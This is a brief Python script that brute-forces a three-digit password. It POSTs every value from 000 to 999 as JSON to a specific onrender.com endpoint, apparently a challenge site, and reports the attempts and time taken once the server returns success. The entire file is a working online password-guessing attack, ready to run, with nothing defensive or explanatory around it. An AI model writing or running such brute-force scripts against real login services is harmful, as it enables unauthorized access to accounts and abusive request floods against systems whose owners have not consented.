import requests
import time

URL = "https://attack-of-the-decade-1.onrender.com"

start = time.time()

for i in range(1000):
    pwd = f"{i:03d}"
    try:
        response = requests.post(URL, json={"password": pwd}, timeout=15)
        
        # Check if response is actually JSON before parsing
        try:
            data = response.json()
        except ValueError:
            print(f"Non-JSON response on {pwd}: status={response.status_code}, body={response.text[:100]}")
            continue

        if data.get("status") == "success":
            elapsed = time.time() - start
            print(f"\n✅ Password found: {pwd}")
            print(f"Attempts taken: {i + 1}")
            print(f"Time elapsed: {elapsed:.2f} seconds")
            break
        else:
            print(f"Tried {pwd} — failed")
    except requests.exceptions.RequestException as e:
        print(f"Request error on {pwd}: {e}")